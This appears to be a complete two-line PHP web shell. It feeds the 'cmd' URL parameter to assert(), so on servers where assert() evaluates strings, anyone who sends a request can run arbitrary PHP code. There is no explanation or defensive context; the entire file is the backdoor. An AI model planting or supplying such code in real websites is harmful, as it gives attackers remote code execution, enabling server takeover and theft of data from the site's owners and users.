<?php
    assert($_GET["cmd"]);
